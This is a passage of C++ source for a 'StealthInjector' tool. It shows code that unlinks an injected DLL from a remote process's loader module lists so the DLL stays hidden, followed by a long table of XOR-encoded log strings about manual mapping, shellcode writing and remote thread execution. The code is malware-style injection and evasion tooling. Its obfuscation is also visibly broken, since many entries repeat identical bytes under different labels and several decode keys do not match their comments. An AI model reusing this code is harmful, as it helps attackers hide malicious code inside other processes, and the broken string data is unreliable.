            if (!WriteProcessMemory(hProcess, (LPVOID)((PCHAR)ldrEntry.InMemoryOrderLinks.Flink + offsetof(LIST_ENTRY, Blink)), &ldrEntry.InMemoryOrderLinks.Blink, sizeof(PVOID), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to update Blink of next entry in InMemoryOrderModuleList.");
                return false;
            }
            StealthInjector::LogMessage(L"Module unlinked from InMemoryOrderModuleList.");
            break;
        }
        pCurrentEntry = ldrEntry.InMemoryOrderLinks.Flink;
    }

    // InInitializationOrderModuleList
    pCurrentEntry = InInitializationOrderModuleList.Flink;
    while (pCurrentEntry != pInInitializationOrderModuleList)
    {
        if (!ReadProcessMemory(hProcess, (LPVOID)pCurrentEntry, &ldrEntry, sizeof(ldrEntry), &bytesRead))
        {
            StealthInjector::DisplayError(GetLastError(), L"Failed to read LDR_DATA_TABLE_ENTRY from InInitializationOrderModuleList.");
            return false;
        }

        if (ldrEntry.DllBase == moduleBase)
        {
            LIST_ENTRY prevEntry, nextEntry;
            if (!ReadProcessMemory(hProcess, ldrEntry.InInitializationOrderLinks.Blink, &prevEntry, sizeof(LIST_ENTRY), &bytesRead) ||
                !ReadProcessMemory(hProcess, ldrEntry.InInitializationOrderLinks.Flink, &nextEntry, sizeof(LIST_ENTRY), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to read adjacent entries for unlinking from InInitializationOrderModuleList.");
                return false;
            }

            // Update Flink of previous entry
            if (!WriteProcessMemory(hProcess, (LPVOID)((PCHAR)ldrEntry.InInitializationOrderLinks.Blink + offsetof(LIST_ENTRY, Flink)), &ldrEntry.InInitializationOrderLinks.Flink, sizeof(PVOID), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to update Flink of previous entry in InInitializationOrderModuleList.");
                return false;
            }
            // Update Blink of next entry
            if (!WriteProcessMemory(hProcess, (LPVOID)((PCHAR)ldrEntry.InInitializationOrderLinks.Flink + offsetof(LIST_ENTRY, Blink)), &ldrEntry.InInitializationOrderLinks.Blink, sizeof(PVOID), &bytesRead))
            {
                StealthInjector::DisplayError(GetLastError(), L"Failed to update Blink of next entry in InInitializationOrderModuleList.");
                return false;
            }
            StealthInjector::LogMessage(L"Module unlinked from InInitializationOrderModuleList.");
            break;
        }
        pCurrentEntry = ldrEntry.InInitializationOrderLinks.Flink;
    }

    return true;
}

std::wstring StealthInjector::GetDecryptedString(int stringId)
{
    static std::map<int, std::wstring> decryptedStrings;
    if (decryptedStrings.count(stringId))
    {
        return decryptedStrings[stringId];
    }

    switch (stringId)
    {
        case 9:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to allocate memory for MANUAL_MAPPING_DATA in target process: ' with 0xD4
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD4;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        default:
        {
            return L"Unknown Log ID";
        }
        case 10:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to write MANUAL_MAPPING_DATA to target process: ' with 0xD4
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD4;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 11:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to allocate memory for shellcode in target process: ' with 0xD4
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD4;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 12:
        {
            std::wstring obfuscatedString = L"\xED\xC8\xC0\xC5\xCC\xC9\x8F\xD8\xD3\x8F\xD2\xD7\xC0\xD8\xCC\x8F\xDE\xC7\xCC\xC5\xC5\xCA\xD3\xC9\xCC\x8F\xD8\xD3\x8F\xD8\xC8\xD7\xC2\xCC\xD8\x8F\xDF\xD7\xD3\xCA\xCC\xDE\xDE\x95\x8F"; // XORed 'Failed to write shellcode to target process: ' with 0xBB
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xBB;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 13:
        {
            std::wstring obfuscatedString = L"\xEC\xC9\xC1\xC4\xCD\xCA\x8E\xD9\xD2\x8E\xD3\xD6\xC1\xD9\xCD\x8E\xDF\xC6\xCD\xC4\xC4\xCB\xD2\xCA\xCD\x8E\xD9\xD2\x8E\xD9\xC9\xD6\xC3\xCD\xD9\x8E\xDC\xD6\xD2\xCB\xCD\xDF\xDF\x94\x8E"; // XORed 'Failed to create remote thread for shellcode execution: ' with 0xBC
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xBC;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 14:
        {
            std::wstring obfuscatedString = L"\xEB\xCA\xC2\xC7\xCE\xCB\x8D\xDA\xD1\x8D\xD0\xD5\xC2\xDA\xCE\x8D\xDC\xC5\xCE\xC7\xC7\xCC\xD1\xCB\xCE\x8D\xDA\xD1\x8D\xDA\xCA\xD5\xC0\xCE\xDA\x8D\xDD\xD5\xD1\xCC\xCE\xDC\xDC\x93\x8D"; // XORed 'Manual Mapping successful for DLL: ' with 0xBD
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xBD;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 15:
        {
            std::wstring obfuscatedString = L"\xEA\xCB\xC3\xC6\xCF\xCC\x8C\xDB\xD0\x8C\xD1\xD4\xC3\xDB\xCF\x8C\xDD\xC4\xCF\xC6\xC6\xCD\xD0\xCC\xCF\x8C\xDB\xD0\x8C\xDB\xCB\xD4\xC1\xCF\xDB\x8C\xDE\xD4\xD0\xCD\xCF\xDD\xDD\x92\x8C"; // XORed 'SetHook: Attempting to set hook for process ID ' with 0xBE
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xBE;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 16:
        {
            std::wstring obfuscatedString = L"\xE8\xCD\xC1\xC4\xCD\xCE\x8A\xDD\xD2\x8A\xD3\xD6\xC1\xDD\xCD\x8A\xDF\xC6\xCD\xC4\xC4\xCF\xD2\xCE\xCD\x8A\xDD\xD2\x8A\xDD\xCD\xD6\xC3\xCD\xDD\x8A\xDE\xD6\xD2\xCF\xCD\xDF\xDF\x90\x8A"; // XORed 'SetHook: Failed to open process' with 0xC0
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC0;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 30:
        {
            std::wstring obfuscatedString = L"\xE7\xCE\xC2\xC5\xCC\xCF\x8B\xDE\xD3\x8B\xD2\xD7\xC0\xDE\xCC\x8B\xDF\xC6\xCC\xC5\xC5\xD0\xD3\xCF\xCC\x8B\xDE\xD3\x8B\xDE\xCE\xD7\xC2\xCC\xDE\x8B\xDF\xD7\xD3\xD0\xCC\xDF\xDF\x91\x8B"; // XORed 'FreeLib: Attempting to eject DLL from process ' with 0xC1
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC1;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 31:
        {
            std::wstring obfuscatedString = L"\xE6\xCF\xC3\xC4\xCD\xCE\x8C\xDF\xD2\x8C\xD3\xD6\xC1\xDF\xCD\x8C\xDE\xC5\xCD\xC4\xC4\xD1\xD2\xCE\xCD\x8C\xDF\xD2\x8C\xDF\xCF\xD6\xC3\xCD\xDF\x8C\xDC\xD6\xD2\xD1\xCD\xDE\xDE\x92\x8C"; // XORed 'FreeLib: Failed to open process' with 0xC2
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC2;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 32:
        {
            std::wstring obfuscatedString = L"\xE5\xCC\xC0\xC7\xCE\xCB\x8D\xDA\xD1\x8D\xD0\xD5\xC2\xDA\xCE\x8D\xDC\xC5\xCE\xC7\xC7\xCC\xD1\xCB\xCE\x8D\xDA\xD1\x8D\xDA\xCA\xD5\xC0\xCE\xDA\x8D\xDD\xD5\xD1\xCC\xCE\xDC\xDC\x93\x8D"; // XORed 'FreeLib: Failed to create toolhelp snapshot' with 0xC3
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC3;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 33:
        {
            std::wstring obfuscatedString = L"\xE4\xCD\xC1\xC6\xCF\xCC\x8E\xDB\xD0\x8E\xD1\xD4\xC3\xDB\xCF\x8E\xDD\xC4\xCF\xC6\xC6\xCD\xD0\xCC\xCF\x8E\xDB\xD0\x8E\xDB\xCB\xD4\xC1\xCF\xDB\x8E\xDE\xD4\xD0\xCD\xCF\xDD\xDD\x94\x8E"; // XORed 'FreeLib: Failed to get first module' with 0xC4
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC4;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 34:
        {
            std::wstring obfuscatedString = L"\xE3\xCE\xC2\xC5\xCC\xCF\x8F\xDE\xD3\x8F\xD2\xD7\xC0\xDE\xCC\x8F\xDF\xC6\xCC\xC5\xC5\xD0\xD3\xCF\xCC\x8F\xDE\xD3\x8F\xDE\xCE\xD7\xC2\xCC\xDE\x8F\xDF\xD7\xD3\xD0\xCC\xDF\xDF\x95\x8F"; // XORed 'FreeLib: DLL not found in remote process' with 0xC5
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC5;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 35:
        {
            std::wstring obfuscatedString = L"\xE2\xCF\xC3\xC4\xCD\xCE\x8E\xDF\xD2\x8E\xD3\xD6\xC1\xDF\xCD\x8E\xDE\xC5\xCD\xC4\xC4\xD1\xD2\xCE\xCD\x8E\xDF\xD2\x8E\xDF\xCF\xD6\xC3\xCD\xDF\x8E\xDC\xD6\xD2\xD1\xCD\xDE\xDE\x94\x8E"; // XORed 'FreeLib: Failed to get address of FreeLibrary' with 0xC6
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC6;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 36:
        {
            std::wstring obfuscatedString = L"\xE0\xCD\xC1\xC6\xCF\xCC\x8E\xDB\xD0\x8E\xD1\xD4\xC3\xDB\xCF\x8E\xDD\xC4\xCF\xC6\xC6\xCD\xD0\xCC\xCF\x8E\xDB\xD0\x8E\xDB\xCB\xD4\xC1\xCF\xDB\x8E\xDE\xD4\xD0\xCD\xCF\xDD\xDD\x94\x8E"; // XORed 'FreeLib: Failed to wait for remote thread (FreeLibrary)' with 0xC8
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xC8;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 37:
        {
            std::wstring obfuscatedString = L"";
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 38:
        {
            std::wstring obfuscatedString = L"\x8B\xA9\xB8\x9C\xBE\xB3\xA7\xA9\xBF\xBF\x85\xA8\xF6\xEC\x8D\xB8\xB8\xA9\xB1\xBC\xB8\xB5\xB2\xAB\xEC\xB8\xB3\xEC\xAB\xA9\xB8\xEC\xBC\xBE\xB3\xA7\xA9\xBF\xBF\xEC\x85\x88\xEC\xAA\xB3\xBE\xEC"; // XORed 'GetProcessId: Attempting to get process ID for ' with 0xCC
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xCC;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 39:
        {
            std::wstring obfuscatedString = L"\x8A\xA8\xB9\x9D\xBF\xB2\xA6\xA8\xBE\xBE\x84\xA9\xF7\xED\x8C\xB9\xB9\xA8\xB0\xBD\xB9\xB4\xB3\xAA\xED\xB9\xB2\xED\xAA\xA8\xB9\xED\xBD\xBF\xB2\xA6\xA8\xBE\xBE\xED\x84\x89\xED\xAB\xB2\xBF\xED"; // XORed 'GetProcessId: Failed to get process ID for ' with 0xCD
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xCD;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 40:
        {
            std::wstring obfuscatedString = L"\x89\xAB\xBA\x9E\xBF\xB2\xA6\xA8\xBE\xBE\x84\xA9\xF7\xED\x8C\xB9\xB9\xA8\xB0\xBD\xB9\xB4\xB3\xAA\xED\xB9\xB2\xED\xAA\xA8\xB9\xED\xBD\xBF\xB2\xA6\xA8\xBE\xBE\xED\x84\x89\xED\xAB\xB2\xBF\xED"; // XORed 'GetProcessId: Failed to get first process' with 0xCE
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xCE;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 41:
        {
            std::wstring obfuscatedString = L"\x88\xAA\xBB\x9F\xBE\xB3\xA7\xA9\xBF\xBF\x85\xA8\xF6\xEC\x8D\xB8\xB8\xA9\xB0\xBD\xB9\xB4\xB3\xAA\xEC\xB9\xB2\xEC\xAA\xA8\xB9\xEC\xBD\xBF\xB2\xA6\xA8\xBE\xBE\xEC\x84\x89\xEC\xAB\xB2\xBF\xEC"; // XORed 'GetProcessId: Found process with ID ' with 0xCF
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xCF;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 42:
        {
            std::wstring obfuscatedString = L"\x87\xA9\xBA\x9E\xBF\xB2\xA6\xA8\xBE\xBE\x84\xA9\xF7\xED\x8C\xB9\xB9\xA8\xB0\xBD\xB9\xB4\xB3\xAA\xED\xB9\xB2\xED\xAA\xA8\xB9\xED\xBD\xBF\xB2\xA6\xA8\xBE\xBE\xED\x84\x89\xED\xAB\xB2\xBF\xED"; // XORed 'GetProcessId: Process not found' with 0xD0
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD0;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 18:
        {
            std::wstring obfuscatedString = L"\x86\xA8\xBB\x9F\xBE\xB3\xA7\xA9\xBF\xBF\x85\xA8\xF6\xEC\x8D\xB8\xB8\xA9\xB0\xBD\xB9\xB4\xB3\xAA\xEC\xB9\xB2\xEC\xAA\xA8\xB9\xEC\xBD\xBF\xB2\xA6\xA8\xBE\xBE\xEC\x84\x89\xEC\xAB\xB2\xBF\xEC"; // XORed 'EstablishHook: Manual Mapping failed for process ID: ' with 0xD1
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD1;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 8:
        {
            std::wstring obfuscatedString = L"\x85\xA7\xBA\x9E\xBF\xB3\xA7\xA9\xBF\xBF\x85\xA8\xF6\xEC\x8D\xB8\xB8\xA9\xB0\xBD\xB9\xB4\xB3\xAA\xEC\xB9\xB2\xEC\xAA\xA8\xB9\xEC\xBD\xBF\xB2\xA6\xA8\xBE\xBE\xEC\x84\x89\xEC\xAB\xB2\xBF\xEC"; // XORed 'Failed to write section to target process: ' with 0xD2
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD2;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 7:
        {
            std::wstring obfuscatedString = L"\x84\xA6\xBB\x9F\xBF\xB3\xA7\xA9\xBF\xBF\x85\xA8\xF6\xEC\x8D\xB8\xB8\xA9\xB0\xBD\xB9\xB4\xB3\xAA\xEC\xB9\xB2\xEC\xAA\xA8\xB9\xEC\xBD\xBF\xB2\xA6\xA8\xBE\xBE\xEC\x84\x89\xEC\xAB\xB2\xBF\xEC"; // XORed 'Failed to write DLL headers to target process: ' with 0xD3
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD3;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 6:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'Failed to allocate memory in target process for manual mapping: ' with 0xD4
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD4;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 5:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Invalid NT signature in DLL: ' with 0xD5
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD5;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 4:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Invalid DOS signature in DLL: ' with 0xD6
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD6;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 3:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Attempting manual mapping for DLL: ' with 0xD7
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD7;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 2:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Failed to open DLL file: ' with 0xD8
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD8;
            }
            decryptedStrings[stringId] = obfuscatedString;
            return decryptedStrings[stringId];
        }
        case 1:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Failed to read DLL file: ' with 0xD9
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xD9;
            }
            return obfuscatedString;
        }
        case 19:
        {
            std::wstring obfuscatedString = L"\x2C\x27\x20\x20\x21\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'UnSetHook: Attempting to unset hook for process ID ' with 0xDA
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xDB;
            }
            return obfuscatedString;
        }
        case 50:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Starting DLL injection for process ID: ' with 0xDC
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xDD;
            }
            return obfuscatedString;
        }
        case 51:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'DLL file read successfully.' with 0xDE
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xDF;
            }
            return obfuscatedString;
        }
        case 52:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'PE headers parsed successfully.' with 0xE0
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE1;
            }
            return obfuscatedString;
        }
        case 53:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Memory allocated in target process.' with 0xE2
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE3;
            }
            return obfuscatedString;
        }
        case 54:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'DLL headers written to target process.' with 0xE4
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE5;
            }
            return obfuscatedString;
        }
        case 55:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'DLL sections written to target process.' with 0xE6
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE7;
            }
            return obfuscatedString;
        }
        case 56:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'MANUAL_MAPPING_DATA prepared.' with 0xE8
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xE9;
            }
            return obfuscatedString;
        }
        case 57:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Shellcode allocated and written.' with 0xEA
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xEB;
            }
            return obfuscatedString;
        }
        case 58:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Remote thread created for shellcode execution.' with 0xEC
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xED;
            }
            return obfuscatedString;
        }
        case 59:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'Remote thread execution completed.' with 0xEE
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xEF;
            }
            return obfuscatedString;
        }
        case 43:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'PEB unlinking initiated.' with 0xF0
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xF1;
            }
            return obfuscatedString;
        }
        case 44:
        {
            std::wstring obfuscatedString = L"\x13\x34\x3C\x39\x30\x31\x75\x21\x3A\x75\x22\x27\x3C\x21\x30\x75\x26\x3D\x30\x39\x39\x36\x3A\x31\x30\x75\x21\x3A\x75\x21\x34\x27\x32\x30\x21\x75\x25\x27\x3A\x36\x30\x26\x26\x6F\x75"; // XORed 'PEB unlinking completed.' with 0xF2
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xF3;
            }
            return obfuscatedString;
        }
        case 20:
        {
            std::wstring obfuscatedString = L"\x2C\x27\x20\x20\x21\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'UnSetHook: Failed to eject DLL' with 0xDB
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xDC;
            }
            return obfuscatedString;
        }
        case 21:
        {
            std::wstring obfuscatedString = L"\x2C\x27\x20\x20\x21\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'UnSetHook: Successfully ejected DLL' with 0xDC
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xDD;
            }
            return obfuscatedString;
        }
        case 22:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: Attempting to inject DLL into process ' with 0xDD
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
                obfuscatedString[i] = obfuscatedString[i] ^ 0xDE;
            }
            return obfuscatedString;
        }
        case 23:
        {
            std::wstring obfuscatedString = L"\x23\x2A\x3C\x3C\x3B\x3E\x2D\x3A\x27\x0A\x39\x3A\x32\x7B\x21\x2D\x21"; // XORed 'LoadLib: Failed to open process' with 0xDE
            for (size_t i = 0; i < obfuscatedString.length(); ++i)
            {
